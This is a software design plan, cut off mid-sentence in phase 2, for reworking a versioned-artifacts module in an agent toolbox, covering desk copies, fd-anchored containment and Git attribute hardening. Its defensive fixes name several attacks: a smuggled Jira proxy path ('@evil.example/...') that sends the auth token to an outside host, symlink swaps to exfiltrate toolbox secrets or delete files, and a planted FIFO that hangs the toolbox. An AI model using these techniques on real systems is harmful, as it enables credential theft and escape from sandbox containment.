# Plan: AG-50 — versioned_folders → serving, drafts on disk, operator CLI

**Branch:** `feature/ag-50-versioned-folders` · **Status:** approved (review round 5) · **Effort:** 18.5 dev-days, envelope 17.5–19.5, phases 0–6

> **Naming is decided:** `versioned_artifacts` (module) / `versioned_artifact` (switch) /
> `versioned_artifact_*` (tools) / `artifact:*` (CLI). See [The naming decision](#the-naming-decision)
> for what that costs the collaboration layer.

---

## Context

The module exists only as uncommitted working-tree state. `git ls-tree main` returns nothing for it and
released 0.16.0 shipped without it, so **every name, table, config key and store path is free to change
today and only today**. After the branch ships, a rename orphans every `tools/<name>/is_enabled` row in
`core_config_data` — and because enablement is keyed by tool name alone, an orphaned row fails *closed*:
the tool is silently disabled, with no error anywhere.

**What changes.** The agent stops editing files through MCP tools and starts editing a plain directory
with its native file tools. MCP handles lifecycle only. Saved versions become real directories under
`storage/`, served read-only over HTTP from their own container on `127.0.0.1`.

**What does not change.** The store stays toolbox-only. The publish compare-and-swap stays. Per-tool
`is_enabled` scoped to `agent_view` remains the only gate — no approval flag, no `is_served` column, no
ACL, no login panel.

---

## Does this collide with the agent-collaboration layer?

Two collisions survive scrutiny. Everything else is clear.

**1. The rename spends the word the destination needs.** The destination's own primitives are
`publish_artifact` / `list_artifacts` / `get_artifact`. `artifact` already names the per-job scratch
directory (`framework/artifacts_dir.py`) in agent-facing text the model reads at tool-selection time
(`core/module.json:14`, `jira/toolbox/jira.js:135`). `module_validator.py` compares exact strings
(`validate_tool_namespace:196-221`), so `versioned_artifact_list` and a future `list_artifacts` would
coexist with no error — the failure is a model or an operator picking the wrong one of two
near-identical tools, and nothing fails loudly. See [The naming fork](#the-naming-fork).

**2. Deleting every read path leaves a reviewer agent with no route to a version.** The settled plan
deleted `read_file` and `list_files` alongside `apply_changes`, and promised "create_draft returns a
filesystem path". But no mount exists that both the toolbox and the agent can reach: the store is bound
into the toolbox only (`templates/docker-compose.yml:59`, `docker-compose.dev.yml:61`), and the serving
container is `127.0.0.1`-only and off `agento-net`. A second agent in a second job could not read a
published version *at all* — not by path, not by tool, not by HTTP. Deleting the readers also kills
`resolveSelector` / `treeishFor` / `treeFiles`, after which `diff` is the only thing in the module that
can produce bytes, and it needs an open draft.

Both are fixed by one change, described below: a `materialize` tool.

**Not collisions** — do not churn these: the CAS publish, the minimal metadata table, the rejected
`is_served` gate, the decision to leave the other 62 tool names alone. `jobs.parent_id` and
`reference_id` need nothing from this plan.

---

## The naming decision

**Decided: `versioned_artifacts`.** The owner reserved the word for this module deliberately
("*artifacts zarezerwujmy dla tych właśnie artefaktów*"), and that stands.

A `versioned_site` alternative was considered and rejected. It would have freed the whole `artifact_*`
namespace for the collaboration layer's `publish_artifact` / `list_artifacts` / `get_artifact`, at the
same cost. It was rejected because "site" is wrong the moment this module holds something a browser does
not render.

**What this costs, recorded so nobody rediscovers it:** `module_validator.py` compares exact tool-name
strings (`validate_tool_namespace:196-221`), so a future `list_artifacts` would coexist with
`versioned_artifact_list` and raise nothing. The failure mode is a model or an operator picking the wrong
one of two near-identical tools, and it fails silently. The open follow-up is whether the collaboration
layer reuses this module rather than adding a second artifact namespace — see
[Reuse by the collaboration layer](#reuse-by-the-collaboration-layer).

---

## Reuse by the collaboration layer — decided

**The collaboration layer reuses this module by REFERENCE, not by row. There is no `type` column.**

A `type: http|handoff` discriminator was considered and rejected. The test applied: a discriminator
earns its keep when every branch on it is a *leaf* — a small local difference in *how* one operation
behaves, with the surrounding contract unchanged. It is a merge in disguise when branching on it changes
*which operations exist*, *who may call them*, or *what the core noun means*. Five of six branches are
not leaves:

| Dimension | Leaf? |
|---|---|
| retention default | leaf — and not even a divergence: phase 3 prunes only *materialized directories*, never history, so `keep_versions=0` is already right for both |
| creation authority | **no** — changes who may call. `init` is allow-list-exempt (`service.js:129-138`) precisely because an administrator runs it before an entry could exist |
| reachability | **no** — `allowed_artifacts` fails closed and blocks the *author*, not only the reader |
| serving | **no, and unreachable** — the check would have to run in a container with no DB, no `env_file`, off `agento-net`, all deliberate |
| `current` / `publish` CAS | **no** — under a handoff, `get_current` actively hides v1, and the CAS refuses the second writer with no merge path (merge/rebase/checkout are banned from the contract and a test asserts it) |

**The integration point is a string.** A collaboration record may carry `{artifact_code, version_id}`.
The *reading* agent calls `versioned_artifact_materialize` itself, gated by its own `is_enabled`. No
cross-module import (the repo has zero today), no `sequence` entry, both modules independently
disableable.

That also buys the thing the merge was reaching for: **the website case gets a review loop for free** —
agent A drafts a version, agent B reviews it, then publish, on the site artifact itself, with no handoff
artifact and no type field involved.

**The collaboration layer is a separate module with its own top-level store root, and its records are
write-once.** "Plan v2" is a new record whose parent is the first, not a new version of the same one.
Both A's plan and B's feedback must stay readable and citable forever; `current` exists to make one
version supersede all others.

**Asymmetry of being wrong:** if append-only proves too thin, ~150 lines are lost and the store can be
re-homed behind the same tool names. If the type column proves wrong, the creation path, the
authorization model and the HTTP exposure of two different things are merged inside one module whose
serving layer cannot tell them apart — discovered when a case record quoting customer data answers at
`http://127.0.0.1:8307/<case-code>/`.

**Deferred deliberately, do not design now:** the wildcard `allowed_artifacts`, an agent-callable
creation tool, a case-root authorization predicate, `job.parent_id`, case retention or deletion, a
version-to-version `diff`, promoting the engine into shared framework JS. Each is cheap when the
collaboration layer is actually built and a guess today. One thing to record so it is not rediscovered:
that layer must not ship bare `publish_artifact` / `list_artifacts` / `get_artifact`, because
`module_validator.py` compares exact strings and two near-identical names fail by silent wrong-selection.

---

## Design changes forced by the collision review

### The desk / store split

There is no mount that both the toolbox and the sandbox can reach for the store, and creating one is the
hardest item here to take back — it would falsify `CLAUDE.md:54-56` and
`docs/architecture/zero-trust.md:84-91`, and hand the agent a Git worktree including its `.git` file.

So: **the store stays authoritative and toolbox-only; the agent works on a disposable copy on its own
desk.** The desk is `/workspace/artifacts/<ws>/<av>/<job_id>/versioned-artifacts/<code>/<id>/` — the only
path both containers already mount read-write (`toolbox :56`, `cron :94`), and whose value
`src/agento/toolbox/server.js:44-53` already derives.

**No tool anywhere accepts a filesystem path as an argument.** The desk path is derived server-side from
the session context. That removes the *caller-supplied path* question — it does **not** remove containment,
because the desk lives in a directory the agent can write. See the next section.

### The desk is agent-owned, so containment must be re-established, not assumed

`safeResolve` (`paths.js:76-101`) lstats every component **below** the root it is given; it never checks
that root or its ancestors. That is sound today, because every root it receives is a store path under
`/srv/versioned-artifacts` and the agent has no route there. The desk breaks the assumption: the agent can
write `/workspace/artifacts/<ws>/<av>/<job_id>/…`, so it can replace the desk directory — or any ancestor
below the job's artifacts dir — with a symlink, before or *during* a copy. Two concrete consequences:

- **Read direction (exfiltration).** `save_version` mirrors the desk into the draft worktree. A symlinked
  desk makes the toolbox read from wherever the link points and commit those bytes into an immutable
  version, which `materialize` then copies back onto the desk for the agent to read. The toolbox is the
  only container with secrets; this is the boundary the whole architecture exists to hold.
- **Write direction (destruction).** `materialize` rm -rf's and recreates the desk dir. Through a symlinked
  *ancestor* that deletes the link target's contents, outside the desk.

The plan therefore specifies, and phase 2 implements, **one mechanism**: the toolbox never resolves a desk
path by name. It holds a **file descriptor** for every directory it descends, and every step is relative to
that descriptor.

1. **`desk-io.js` — the only module that touches the desk.** Node exposes no `openat(2)`, but Linux does,
   through `/proc/self/fd`: the kernel resolves `/proc/self/fd/<dirfd>/<name>` from the descriptor's own
   inode instead of re-walking the path, so `<name>` is a **single** component and `O_NOFOLLOW` therefore
   covers all of it. That is `openat` with no native module and no child process. Four primitives, each one
   `fs` call:

   | primitive | call |
   |---|---|
   | `openDirAt(fd, name)` | `openSync('/proc/self/fd/'+fd+'/'+name, O_RDONLY\|O_DIRECTORY\|O_NOFOLLOW)` |
   | `openFileAt(fd, name, flags)` | same path; `O_RDONLY\|O_NOFOLLOW\|O_NONBLOCK` to read, `O_WRONLY\|O_CREAT\|O_EXCL\|O_NOFOLLOW` to write |
   | `mkdirAt` / `readdirAt` | `mkdirSync` / `readdirSync` on `/proc/self/fd/<fd>[/<name>]` |
   | `unlinkAt` / `rmdirAt` | `unlinkSync` / `rmdirSync` on `/proc/self/fd/<fd>/<name>` |

   Measured in the real `agento-3-toolbox-1` container against the real `/workspace/artifacts` bind mount:
   a descriptor held across an ancestor swap still reads the original directory (`['f']` — the planted
   `creds` never appears), re-opening the swapped name is refused (`ENOTDIR`), and `unlinkAt` on a symlink
   planted inside the desk removes the **link** while its target survives.

2. **The walk is the containment proof — no `realpath` anywhere on the desk side.** Open
   `/workspace/artifacts` (the bind-mount point: pinned by the mount, and the constant `server.js:45`
   derives the job dir *from*), then `openDirAt` through `<ws>`, `<av>`, `<job_id>`, `versioned-artifacts`,
   `<code>` and `<id>`, holding every descriptor. A component that is a symlink **at open time** is refused
   by `O_NOFOLLOW`; a component replaced **after** its open is irrelevant, because the descriptor already
   pins the inode. This is why the boundary must be the mount point and not the job's own dir: the sandbox
   mounts `../workspace:/workspace` read-write (`docker-compose.dev.yml:16`), so `<ws>`, `<av>` and
   `<job_id>` are all agent-writable, and a `realpath`-based assert rooted at `<job_id>` proves nothing the
   moment `<job_id>` is a symlink to `/`.

3. **Missing components are created for a materialize, never for a save.** `openDesk` takes an explicit
   `{ create }`:
   - `create: true` (`materialize`, `create_draft`) — a missing component is `mkdirAt`'d (tolerating
     `EEXIST`) and re-opened. A fresh desk needs no `realpath` of a path that does not exist yet.
   - `create: false` (`save_version`) — a missing desk is refused with `DESK_MISSING` **before** the
     worktree is touched.

   The two must not share one default. `save_version` mirrors the desk *and deletes worktree files absent
   from it*, so silently creating an empty desk would read as "the agent deleted every file" and mint an
   empty version over a good one — data loss reported as success. A missing desk is an ordinary path, not
   an exotic one: the desk is disposable by design, and a container restart, a retry in a different job,
   or an operator clearing `workspace/artifacts` each remove it. Absence and emptiness are different
   states, and only absence is refused — an *existing* desk the agent deliberately emptied still saves
   the deletions.

4. **Three operations, one walker.** `mirrorOut(deskFd → trusted)` for `save_version`, `mirrorIn(trusted →
   deskFd)` for `materialize`, and `emptyDesk(deskFd)` in place of `fs.rmSync(recursive)`. Each descends
   with the primitives above, `fstat`s the descriptor it just opened, and handles **only** regular files and
   directories — a symlink cannot be opened at all under `O_NOFOLLOW`, and the `fstat` mode check refuses a
   device, fifo or socket. `max_files` / `max_file_size` / `max_total_size` are counted on the bytes
   actually read from the descriptor, never from a prior `stat` that a concurrent replacement would
   invalidate.

   **`O_NONBLOCK` on the read is load-bearing, not decoration.** Opening a FIFO `O_RDONLY` blocks until a
   writer arrives, and it blocks *inside `open`* — before `fstat` can run, so the mode check above never
   gets to reject it. Measured in the container: `openSync(fifo, O_RDONLY|O_NOFOLLOW)` never returned and
   was killed at 2 s; adding `O_NONBLOCK` returned a descriptor whose `fstat` reports `isFIFO: true`,
   `isFile: false`, rejectable before a single byte is read; a regular file opened with the same flag
   reads normally. Because `desk-io.js` is synchronous, a blocked `open` would hang the whole toolbox
   event loop — every session, not merely the one being attacked — and `mkfifo` needs no privilege, so any
   agent can plant one. The other three opens in the module were checked and are safe with no flag
   change: `openDirAt` on a FIFO fails `ENOTDIR` at once (`O_DIRECTORY` is decided before the FIFO wait),
   `mirrorIn`'s `O_CREAT|O_EXCL` write onto a planted FIFO fails `EEXIST`, and a unix socket fails
   `ENXIO`. Only the read path needed the flag.

5. **`tar` never touches the desk.** `tar -xf … -C <dir>` **does** escape through a symlinked destination
   (measured: it wrote outside the desk). So a version is extracted into a toolbox-owned temporary
   directory on the store volume — `/srv/versioned-artifacts/.tmp/<id>`, which the agent has no route to —
   and `mirrorIn` then copies it onto the desk. A draft needs no extraction at all: its worktree is already
   toolbox-owned, so `mirrorIn` reads it directly. (`fs.cpSync` into a symlinked destination was measured
   too and is *contained* — it throws `ERR_FS_CP_DIR_TO_NON_DIR` — but the desk side uses `mirrorIn`
   regardless, so no `fs` recursive helper is ever trusted with containment.)

6. **The mirror never deletes `.git`.** Phase 2.8(a) deletes worktree files absent from the desk; the
   worktree's `.git` **file** (the pointer `worktree add` writes) is absent from the desk by construction,
   so a naive mirror destroys the draft. Exclude it explicitly, and equally refuse to copy a `.git` *from*
   the desk into the worktree.

7. **No path-shaped value crosses the boundary either way** — the tool returns `{path}` for the agent's own
   use and never accepts one back.

**`desk-io.js` is Linux-only, deliberately.** `/proc/self/fd` *is* the mechanism; the desk exists only
inside the toolbox container, which is always Linux. The module therefore throws on any other platform
rather than falling back to the path-based walk this section exists to delete. `paths.js`'s `safeResolve`
stays untouched and keeps guarding the **store** side, where every root is under `/srv/versioned-artifacts`
and no agent has a route.

**Test placement.** `tests/versioned-artifacts/desk-containment.test.js` is
`describe.skipIf(process.platform !== 'linux')`. That is real coverage, not a hole: CI runs
`cd src/agento/toolbox && npm ci && npm test` on `ubuntu-latest` (`.github/workflows/ci.yml:58`), so every
push executes it, and it skips only on a macOS dev host where the mechanism does not exist. No current
`versioned_folders` test touches a desk (grepping `artifactsDir|materializ` across
`tests/versioned-folders/` returns nothing), so the gate costs no existing coverage. The suite must include
the case the walk exists for: complete the walk, **then** rename a component aside and replace it with a
symlink, and assert the held descriptor still reads the desk and that re-opening the name is refused —
replacement *after* validation, not only before it.

### `materialize` replaces the deleted readers

`versioned_artifact_materialize(artifact_code, draft_id? | version_id?) → {path}` copies a draft or a version
onto the calling job's desk. `apply_changes` still dies (it is the writer the desk model supersedes);
the *readers* come back in a better shape — files the reading agent opens with its native tools, which
is also the natural shape of the destination's `get_artifact`.

It is not extra work: it is reused by phase 3 to build the published tree, and the selector helpers it
needs already exist.

### Drop the `user` parameter

`user: z.string().email().max(255)` (`versioned-folders.js:11-14`) is an unverified, self-declared
address, while the trustworthy identity — `jobId`, `agentViewId` — is already in `register(context)` and
already written to its own audit columns on the same row. An `agent_view` whose SOUL.md carries no email
cannot call any tool in the module: zod rejects before the handler runs.

Drop the field and the `service.forActor(args.user)` call. **Also delete `forActor` itself** — `cli.js`
uses the `actor` *constructor* option (`cli.js:21-22`), not `forActor`, so after this it has no
production caller. Two tests reference it (`service.test.js:138-142`, `tools.test.js:192`) and go with
it. **Leave the identical parameter alone** in `schedule.js`, `browser.js`, `jira.js` and `email.js` —
those interpolate the raw value into operator log lines, where `.email()` is real log-forging defence.

### Retention is opt-in

`serving/keep_versions` defaults to **0 = keep everything**. Pruning is right for a live site and is data
loss for a record. This revises the earlier "keep the last N" default; the "never prune the target of
`current`" rule stays and is enforced in code.

### `agent_view_id INT UNSIGNED`

`sql/001` declares `agent_view_id INT NULL`; `agent_view.id` is `INT UNSIGNED`
(`framework/sql/014_workspace_agent_view.sql`). One word, free now, an `ALTER MODIFY` later.

---

## Definition of Done

1. Ten tools: one switch + nine members, every `is_enabled` default `"0"`, every member `requires` the switch.
2. No tool schema contains a `user` key or any path-shaped parameter.
3. The agent can create a draft, edit the returned directory with plain shell commands, save a version,
   keep editing, and save again — two distinct versions from one draft.
4. Every saved version exists as a real directory under the published root; `current` is a **relative**
   symlink swapped with `fs.rename`.
5. `curl http://127.0.0.1:<port>/<code>/` serves the published version from the Mac; the same request
   from the LAN address is refused.
6. `agento artifact:list` and `agento artifact:publish` work from the host.
7. A version materializes byte-identically to its stored blobs even when the tree carries a
   `.gitattributes` that tries to transform it (`export-ignore`, `export-subst`, `text eol=crlf`).
8. `AGENTO_E2E=1 bin/test` green, `module:validate` green.
9. No doc in the repo still claims a behaviour this work changed.

---

## Phase 0 — Close the Jira proxy credential hole · 0.5 d · fully independent

Ships on its own commit, before anything else. Touches no `versioned_*` file.

1. `jira/toolbox/jira-proxy.js:26` — delete the `req.body.jira_host ||` override so the line reads
   `const host = config.host;`. No in-repo caller passes it (`onboarding.py` writes `jira/jira_host` via
   `config_set`; `jira_periodic_tasks` passes only `admin_auth`). Leave the `auth_user`/`auth_token`
   overrides — bringing your own credential to the *configured* host is harmless.
2. **Scope addition, named as such:** removing `jira_host` alone does **not** close the
   credential-exfiltration class. `:52` does `fetch(host + path)`, so `path: '@evil.example/rest/api/3/myself'`
   yields a valid URL whose host is `evil.example`, and the `Authorization: Basic` header follows it.
   After the `ALLOWED_METHODS` check, refuse unless `typeof path === 'string' && path.startsWith('/') && !path.startsWith('//')`
   → 400 `{error: 'path must be a host-relative path'}`.
3. Log one WARN when `req.body.jira_host` is present, so an out-of-repo caller learns why it was ignored.
4. `jira/src/toolbox_client.py` — remove the `jira_host` keyword and its payload branch.

**Tests:** a request naming another host reaches only the configured host; `@evil.example/...` and
`//evil.example/x` are both 400; the normal path still works.
**Done when:** the proxy cannot be made to send the token anywhere but `config.host`.

---

## Phase 1 — Rename, schema fixes, storage directories, attribute hardening · 2 d · depends on nothing

One mechanical sweep, done once while nothing has shipped. After it the module behaves exactly as before
under new names.

1. `git mv` the trees: `modules/versioned_folders` → `modules/versioned_artifacts`;
   `toolbox/tests/versioned-folders` → `versioned-artifacts`; `tests/unit/modules/versioned_folders` →
   `versioned_artifacts`; `toolbox/versioned-folders.js` → `versioned-artifacts.js`;
   `workspace/versioned-folders.md` → `versioned-artifacts.md`; `docs/modules/versioned-folders.md` →
   `versioned-artifacts.md`; `docs/cli/versioned-folder-init.md` → `docs/cli/artifact-init.md`.
2. Sweep identifiers across `src/ tests/ docs/ docker/`: module `versioned_folders` → `versioned_artifacts`
   (also the config-path prefix); tool prefix `versioned_folder_` → `versioned_artifact_`; master switch →
   **singular** `versioned_artifact`; table `versioned_folder_audit` → `versioned_artifact_audit`; audit OPS
   strings (`service.js:38-45`); `GIT_OPERATION_FAILED` → `STORAGE_OPERATION_FAILED` (`errors.js:9`,
   `service.js asVfError`, `cli.js` fallback, `git-backend.js` call sites).
   **Not a blind sed:** `module.json`'s `toolset` field currently holds the same literal as both the
   module name and the switch. Map it explicitly — `toolset: "versioned_artifacts"` (module name, per
   `module_validator.py:404-409` and `module_scaffold.py:78`), switch tool name `versioned_artifact`.
3. Rename the domain noun: `folder_code` → `artifact_code` everywhere; `FOLDER_CODE_RE` → `ARTIFACT_CODE_RE`,
   `validateFolderCode` → `validateArtifactCode`, `folderRoot` → `artifactRoot`; config `allowed_folders` →
   `allowed_artifacts`; `FOLDER_NOT_FOUND` / `FOLDER_ACCESS_DENIED` / `FOLDER_TOO_LARGE` → `ARTIFACT_*`.
4. CLI: `di.json` `versioned-folder:init` → `artifact:init`; `TOOLBOX_CLI` → `/app/modules/core/versioned_artifacts/toolbox/cli.js`.
   In `framework/cli/__init__.py:48-50` set `_LOCAL_MODULE_COMMANDS = {"artifact:init", "artifact:list", "artifact:publish"}`
   (the last two arrive in phase 4; between now and then `agento artifact:list` fails as an unknown command
   rather than being proxied — acceptable, but know it).
   **Also change `VersionedFolderInitCommand.shortcut`** (`src/commands/init.py:126`), which returns
   `"vf:init"`. If it survives the sweep, `agento vf:init` is no longer in the local set and
   `_should_proxy` (`framework/cli/__init__.py:68`) sends it into the cron container, which has neither
   the docker socket nor the compose file — it breaks with no readable error.
   `tests/unit/modules/.../test_init_command.py:45-46` asserts the membership being changed.
5. SQL: rename `sql/001_versioned_folder_audit.sql` → `001_versioned_artifact_audit.sql`, rename the table
   inside, change `agent_view_id INT NULL` → `INT UNSIGNED NULL`. Add `sql/002_versioned_artifact.sql`:
   `artifact_code VARCHAR(64) PRIMARY KEY, title VARCHAR(255) NULL, owner VARCHAR(255) NULL, created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP`.
   No `current_version` column — the ref CAS is the only serialization point. No authorization
   columns. **No `type` column** — see [Reuse by the collaboration layer](#reuse-by-the-collaboration-layer-—-decided);
   should that decision ever reverse, `sql/003 ADD COLUMN type … DEFAULT 'http'` backfills every
   existing row correctly, which is what `schema_migration` is for.
6. Storage paths: `storage_root` → `/srv/versioned-artifacts/store`; change the toolbox bind in **both**
   `templates/docker-compose.yml:59` and `docker-compose.dev.yml:61` to
   `../storage/versioned-artifacts:/srv/versioned-artifacts`.
   **Move any existing store**, or every initialized folder is orphaned one level up:
   `mv storage/versioned-folders storage/versioned-artifacts/store`. Record it next to the schema recovery note.
   **`storage/versioned-artifacts/` is this module's store root alone.** A future collaboration
   store gets its own top-level directory, never a sibling inside this tree — that separation is
   what makes an `is_served` flag and a serve-time type check unnecessary, because unserved bytes
   are physically outside the served tree.
   (`published_root` and its validation both land in phase 3 — splitting a config key from the code that
   validates it means shipping a field `createService` ignores.)
7. Add `ensure_storage_dirs(project_dir)` to `framework/cli/_provisioning.py`: `mkdir(parents=True, exist_ok=True)`
   for `storage/versioned-artifacts/store` and `.../published`. Call it from `install.py _scaffold`
   (replacing the `storage/versioned-folders` literal at `:87`) **and** from `upgrade.py` immediately
   before `regenerate_compose(project_root)` at `:229`. This is the answer to the open item: creating
   the directories from the host CLI is what gets the ownership right on Linux — they inherit the
   invoking user, which is `HOST_UID`, which is `agent` inside the container.
8. `framework/docker/toolbox/entrypoint.sh` — replace the `/srv/versioned-folders` block with
   `mkdir -p /srv/versioned-artifacts/store /srv/versioned-artifacts/published` and a **non-recursive** chown of
   each to `agent`, still `|| true`. This is the braces for the dev-compose path where nobody ran the CLI.
9. Test scaffolding that names the module by path: `toolbox/tests/tool-declaration.test.js` (import,
   registry, file list, config fixture) and the `DIR` constant in the renamed `layering.test.js`.
10. Pass `--template=` to `git init --bare` (`git-backend.js:290`). Every artifact currently carries
    14 unused hook samples (~26 KiB, 14 inodes) while `HARDEN` already sets `core.hooksPath=/dev/null`
    (`git-backend.js:15`), so they can never run. One argument, one assertion that a fresh artifact
    has no `hooks/*.sample`. Right either way; awkward once a production store exists.
11. **Neutralize tree-controlled Git attributes** — write
    `* -export-ignore -export-subst -text -eol -filter !diff -ident !working-tree-encoding`
    to `<repo.git>/info/attributes`, and extend `HARDEN`'s comment to say why.

    **Written on every store open, not at `init` only.** `requireFolder` (`git-backend.js:104-108`) is the
    gate all eleven tree-touching operations pass through to resolve the repo dir — the only direct
    `repoDir` callers are `init` (which creates the repo), `teardownDraft` (which reads no tree) and the
    existence scan at `:439` — so the line is written there: read the file, and when the content differs
    write it through a temp file plus `rename`. Idempotent by construction, one `readFile` per operation.
    An `init`-only write would leave every store that already exists permanently unprotected, including
    the one this branch has been developed against; since the defect is pre-existing, migrated stores are
    precisely the ones that need the fix. Not `core.attributesFile` in `HARDEN`: that has *lower*
    precedence than an in-tree `.gitattributes`, so the agent's committed file would still win. **`!diff`, not `-diff`** — the two states are not interchangeable: `-diff` means
    *Unset*, which tells Git the file **is binary**, so every `diff` the module runs prints
    `Binary files a/f.txt and b/f.txt differ` and the diff tool returns nothing useful. `!diff` means
    *Unspecified* — no in-tree rule applies and Git auto-detects, which is the behaviour of a repo with no
    attributes at all. Measured, same repo, one text file changed across two commits: no `info/attributes`
    → textual hunk; `… -diff` → `Binary files … differ`; `… !diff` → textual hunk. The same reasoning picks
    `!working-tree-encoding` (a value there re-encodes on checkout; *Unset* is not a defined state for it),
    while `-ident` is correct because `ident` is a plain boolean whose *Unset* state is "do not expand
    `$Id$`". `$GIT_DIR/info/attributes` has the **highest** precedence in Git's attribute
    lookup, and the bare repo is toolbox-only, so this is the one place the agent cannot override.

    This is a **pre-existing defect in the module as committed**, not something phase 2 introduces. An
    agent commits a `.gitattributes` into a draft and Git then silently transforms bytes on every path
    that reads the tree. Verified locally against a real repo — stored blob `61 0a 62 0a`:

    | Path | Attribute | Without | With `info/attributes` |
    |---|---|---|---|
    | worktree checkout (`createDraft`, every draft **today**) | `* text eol=crlf` | `61 0d 0a 62 0d 0a` — mangled | `61 0a 62 0a` |
    | `git archive` (phase 2.5 `materialize`) | `hidden.txt export-ignore` | file **missing** from the archive | present |
    | `git archive` | `keep.txt export-subst` | `$Format:%H$` replaced with the commit sha | literal, unsubstituted |
    | `diff` | `diff`/`binary` | output can be forced to "Binary files differ" or through a `textconv` | real diff |
    | worktree checkout | `ident.txt ident` | `$Id$` rewritten to `$Id: <blob sha> $` | literal `$Id$` |

    So `finalize` can today mint an immutable version whose bytes differ from what the agent wrote, and
    phase 2's "a version materializes byte-identically" is unachievable without this line. One line closes
    all four instances; the assertion is one test per reading path (checkout, archive, diff) proving the
    bytes equal `git cat-file blob`.
12. Prose: `CLAUDE.md`, `docs/architecture/zero-trust.md:78-96`, **`docs/architecture/containers.md`**,
    **`framework/docker/toolbox/Dockerfile:30-32`** (its comment names the store path),
    `docs/modules/README.md`, `docs/cli/README.md`, `docs/tools/README.md`, `ROADMAP.md`,
    **`AGENTS.md`** and **`README.md`**. `grep -rln 'versioned_folder\|versioned-folder\|VersionedFolder' .`
    is the authoritative list — 43 files.

**Tests:** `module:validate`; `tool-declaration.test.js`; the whole renamed vitest suite unchanged in
behaviour; `test_install.py` and `test_upgrade.py` each create both storage directories;
`test_provisioning.py` asserts the new toolbox bind. For item 11, one test per reading path: a draft whose
tree carries `* text eol=crlf` checks out byte-identically to `git cat-file blob`; a fresh artifact's
`info/attributes` holds the neutralization line; and a store whose `info/attributes` has been deleted or
altered (standing in for a store created before this change) has the line back after the next ordinary
operation — the guard for the migrated-store class.
**Done when:** `AGENTO_E2E=1 bin/test` green and `grep -rn 'versioned_folder\|versioned-folder' . --exclude-dir=.git`
returns nothing outside `DECISIONS.md`'s historical entries.
**Risk:** a missed string in a JSON manifest silently disables a tool — which is why `module:validate`
and `tool-declaration.test.js` both gate the phase.
**Dev DB recovery:** `DROP TABLE versioned_folder_audit; DELETE FROM schema_migration WHERE module='versioned_folders';`

---

## Phase 2 — Desk copies, `materialize`, `save_version`, containment · 5.5 d · needs phase 1

The heaviest and most delicate phase. It rewrites the draft state machine, which the regression suite
covers most heavily, and it is where the desk's containment is established. Budget honestly: this is not
a 3-day phase.

1. Settle the surface in `module.json` / `config.json` — `versioned_artifact` (switch) plus
   `_list`, `_get_current`, `_list_versions`, `_create_draft`, `_materialize`, `_save_version`, `_diff`,
   `_publish`, `_discard_draft`.
2. Delete `apply_changes`, `list_files`, `read_file` from the manifests and `versioned-artifacts.js`. In
   `git-backend.js` delete `applyChanges` (`:525-634`) and `restoreWorktree` (`:516-523`).
   **Keep** `requireOneSource`, `treeishFor`, `resolveSelector`, `treeFiles` (`:212-250`) — `materialize`
   is their new caller.
3. Drop `user` from `folderArg`; call the service directly in the `run` helper; delete `forActor`
   (`service.js:257`) and its two tests.
4. Desk derivation in `versioned-artifacts.js`: `deskDir(artifactsDir, artifactCode, id)`, with `artifactsDir`
   destructured from the MCP session context. If it is missing or ends in `_fallback`, every
   desk-touching tool returns `WORKSPACE_UNAVAILABLE` rather than writing to a shared fallback directory.
   Add **`desk-io.js`** — the fd-anchored walker from [The desk is agent-owned](#the-desk-is-agent-owned-so-containment-must-be-re-established-not-assumed):
   `openDesk(artifactsDir, artifactCode, id, { create }) → dirfd` opens `ARTIFACTS_ROOT`
   (`/workspace/artifacts`, the bind-mount point) and `openDirAt`s down through `<ws>`, `<av>`,
   `<job_id>`, `versioned-artifacts`, `<code>` and `<id>`. `create: true` makes a missing component with
   `mkdirAt`; `create: false` refuses a missing desk with `DESK_MISSING`, and `save_version` is the caller
   that must pass it — see rule 3 of that section. Add `DESK_MISSING` to `errors.js` and to both error
   tables (`workspace/versioned-artifacts.md`, `docs/modules/versioned-artifacts.md`); it is distinct from
   `WORKSPACE_UNAVAILABLE` because the remedies differ — `WORKSPACE_UNAVAILABLE` means the session has no
   workspace at all and the agent can do nothing, while `DESK_MISSING` means "materialize the draft first"
   and is recoverable by the agent alone, which is exactly what item 11's draft listing exists to enable.
   `artifactsDir` supplies the component
   *names*; the trust anchor is the mount point, because the job dir is itself one of the components the
   agent can replace. It is a new module rather than a function in `paths.js`: `paths.js` answers "is this
   path string acceptable", `desk-io.js` performs I/O and hands back descriptors, and the backend keeps
   taking only already-verified paths.
5. Add `materialize(storageRoot, artifactCode, selector, destFd)` to `git-backend.js` — it takes the desk
   **descriptor**, never a desk path. Two paths, deliberately not abstracted: a draft is
   `mirrorIn(draftDir, destFd)` filtering the top-level `.git`; a version is
   `git archive --format=tar --output=<tmp.tar> <treeish>`, then `tar -xf <tmp.tar> -C <tmpDir>` into a
   toolbox-owned `/srv/versioned-artifacts/.tmp/<id>`, then `mirrorIn(tmpDir, destFd)`, with both
   temporaries removed unconditionally. Two sequential `execFile` calls through `git-exec.js`, no pipes, no
   new dependency; verify `tar --version` exists in the toolbox image once. `tar` writes only inside the
   store volume and never onto the desk — measured, it follows a symlinked `-C` destination straight out.
   Route both through `resolveSelector` so an unknown version still yields `VERSION_NOT_FOUND`.
   `git archive` is byte-faithful **only** because phase 1 item 11 neutralized `export-ignore` /
   `export-subst` in `info/attributes`; without that line this step silently drops and rewrites files, so
   the two ship together and the byte-identity test belongs to both.
6. Wire `versioned_artifact_materialize` → `{path}`: `openDesk(…, { create: true })` **first** — the
   descriptor it returns *is* the containment proof — then `emptyDesk(deskFd)`, an fd-anchored `unlinkAt`/`rmdirAt` descent rather
   than `fs.rmSync(recursive)` on a path, then the backend with that same descriptor. Nothing in the
   sequence re-resolves the desk by name, so no window exists between the check and the destructive step.
   The old "check the path, then rm -rf the path" ordering had one by construction.
7. `create_draft` creates the draft in the store as today, then materializes it, returning
   `{draft_id, base_version, path}`.
8. `finalize` → `save_version(artifact_code, draft_id, description)`. Split today's finalize (`:697-760`)
   into (a) mirror the desk into the draft worktree; (b) `git add -A` + commit with the existing trailers;
   (c) `createVersionRef`. **Remove the teardown** — the draft stays open, so a second `save_version`
   yields a second version. `discard_draft` becomes the only way to close a draft.

   Step (a) opens the desk with `openDesk(…, { create: false })` **before** anything mutates the
   worktree, so a desk that no longer exists fails with `DESK_MISSING` and leaves the draft and the
   version history exactly as they were. Creating it here would delete every worktree file as an inferred
   deletion and mint an empty version.

   The mirror in (a) is the one operation that reads agent-owned bytes into the store, so it *is*
